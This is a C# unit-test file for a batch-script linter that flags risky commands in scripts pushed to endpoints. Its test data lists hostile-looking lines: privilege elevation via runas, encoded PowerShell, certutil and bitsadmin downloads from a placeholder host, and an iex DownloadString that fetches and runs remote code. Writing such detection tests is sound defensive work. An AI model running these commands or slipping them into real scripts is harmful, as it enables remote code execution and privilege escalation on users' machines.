using EndpointAgents.Shared.Office;

namespace ControlPlane.Api.Tests;

public sealed class BatScriptLintTests
{
    [Theory]
    [InlineData("runas /user:Administrator cmd")]
    [InlineData("powershell -Command \"Start-Process cmd -Verb RunAs\"")]
    [InlineData("powershell -NoProfile -EncodedCommand SQBFAFgA")]
    [InlineData("powershell -nop -enc SQBFAFgA")]
    [InlineData("certutil -decode payload.b64 run.ps1")]
    [InlineData("certutil -urlcache -f http://example.test/x.bat x.bat")]
    [InlineData("bitsadmin /transfer job http://example.test/x x")]
    [InlineData("powershell iex (New-Object Net.WebClient).DownloadString('x')")]
    public void UnreviewablePayloadsAndElevationAreRejected(string line)
    {
        var result = BatScriptLint.Inspect($"@echo off\r\n{line}\r\nexit /b 0\r\n");

        Assert.Single(result.Errors);
        Assert.StartsWith("Line 2:", result.Errors[0]);
    }

    [Theory]
    [InlineData("timeout /t 5")]
    [InlineData("start \"\" notepad.exe")]
    [InlineData("if exist x.txt (start x.txt)")]
    [InlineData("mshta vbscript:Close()")]
    [InlineData("msg * hello")]
    [InlineData("call %TEMP%\\next.bat")]
    public void FragileUnattendedCommandsAreWarnings(string line)
    {
        var result = BatScriptLint.Inspect($"@echo off\r\n{line}\r\n");

        Assert.Empty(result.Errors);
        Assert.Single(result.Warnings);
    }

    [Fact]
    public void CommentsLabelsAndOrdinaryTextAreIgnored()
    {
        var result = BatScriptLint.Inspect(string.Join("\r\n",
            "@echo off",
            "rem runas /user:x and timeout /t 5 are only described here",
            ":: start a new window would be bad",
            ":start",
            "goto start",
            "echo Please restart Office after the repair.",
            "set /p \"choice=Main menu choice: \"",
            "exit /b 0"));

        Assert.Empty(result.Errors);
        Assert.Empty(result.Warnings);
    }

    [Fact]
    public void CheckedInSampleBatsAreClean()
    {
        var root = FindRepositoryRoot();
        foreach (var path in new[]
        {
            Path.Combine(root, "deploy", "samples", "menu-scenarios-sample.bat"),
            Path.Combine(root, "deploy", "control-plane", "FileRepository",
                "office-activation-repair.bat")
        })
        {
            var result = BatScriptLint.Inspect(File.ReadAllText(path));
            Assert.Empty(result.Errors);
            Assert.Empty(result.Warnings);
        }
    }

    private static string FindRepositoryRoot()
    {
        var directory = new DirectoryInfo(AppContext.BaseDirectory);
        while (directory is not null
               && !File.Exists(Path.Combine(directory.FullName, "EndpointAgents.slnx")))
            directory = directory.Parent;
        return directory?.FullName
            ?? throw new DirectoryNotFoundException("Repository root not found.");
    }
}
